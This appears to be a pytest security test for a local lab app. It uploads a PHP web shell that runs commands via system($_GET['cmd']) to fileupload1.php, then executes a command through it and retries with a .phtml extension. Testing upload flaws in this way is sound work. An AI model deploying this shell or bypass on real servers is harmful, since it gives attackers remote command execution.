import pytest
import requests
import os

def test_file_upload_vulnerability(session):
    """Test if file upload vulnerability exists in fileupload1.php"""
    
    # Setup
    url = "http://localhost/FileUpload/fileupload1.php"
    
    # Create a malicious PHP file for testing
    malicious_content = """<?php
    echo "Malicious file executed successfully";
    system($_GET['cmd']);
    ?>"""
    
    # Create the test file
    files = {
        'file': ('malicious.php', malicious_content, 'application/x-php')
    }
    
    # Execute the upload
    response = session.post(url, files=files, data={'submit': 'Submit'})
    
    # Verify the upload was successful
    assert "File uploaded /uploads/malicious.php" in response.text, \
           "File upload vulnerability not confirmed - upload failed or was blocked"
    
    # Try to verify the file is accessible and executable
    uploaded_url = "http://localhost/FileUpload/uploads/malicious.php"
    verify_response = session.get(uploaded_url, params={'cmd': 'echo test123'})
    
    # Check if we can execute commands through the uploaded file
    assert "Malicious file executed successfully" in verify_response.text or \
           "test123" in verify_response.text, \
           "File upload vulnerability not fully confirmed - uploaded file not executable"
    
    # Additional test with different file type
    files = {
        'file': ('shell.phtml', malicious_content, 'application/x-php')
    }
    
    # Try alternative extension
    response = session.post(url, files=files, data={'submit': 'Submit'})
    assert "File uploaded /uploads/shell.phtml" in response.text, \
           "File upload vulnerability not confirmed for alternative PHP extension"
